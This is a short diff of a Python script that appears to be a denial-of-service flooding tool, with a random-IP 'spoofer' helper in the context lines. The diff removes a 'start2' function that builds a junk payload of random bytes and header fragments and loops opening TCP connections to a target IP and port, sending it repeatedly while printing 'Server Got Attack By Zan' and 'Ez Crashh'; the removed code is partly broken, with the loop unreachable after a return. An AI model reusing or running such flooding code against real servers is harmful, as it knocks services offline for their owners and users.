@@ -132,30 +132,7 @@ def spoofer():
     addr[4] = str(random.randrange(2, 254))
     acces =  addr[1] + addr[2] + addr[3] + addr[4]
     return acces
-def start2():
-  global useragents, acceptall, ref, socks5
-  global byte3, byte4
-  byte3 = random._urandom(40552)
-  byte4 = random.choice(acceptall)+random.choice(ref)
-  reef = random.choice(ref)
-  acceppt = random.choice(socks5)+random.choice(acceptall)+random.choice(ref)+"\r\n"
-  byte_host = byte3 + byte4 + acceppt + "\r\n"
-  return byte_host
-  while True:
-            try:
-               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-               s.connect((str(ip),int(port)))
-               s.send(byte_host)
-               for i in range(pack):
-                   s.send(byte_host)
-                   xx += random.randint(0, int(pack))
-                   print("Server Got Attack By Zan ")
-            except:
-                  s.close()
-                  print("Ez Crashh")
-                  
-  return byte3
-  return byte4
+
   
 def start():
   global useragents, acceptall, ref, socks5
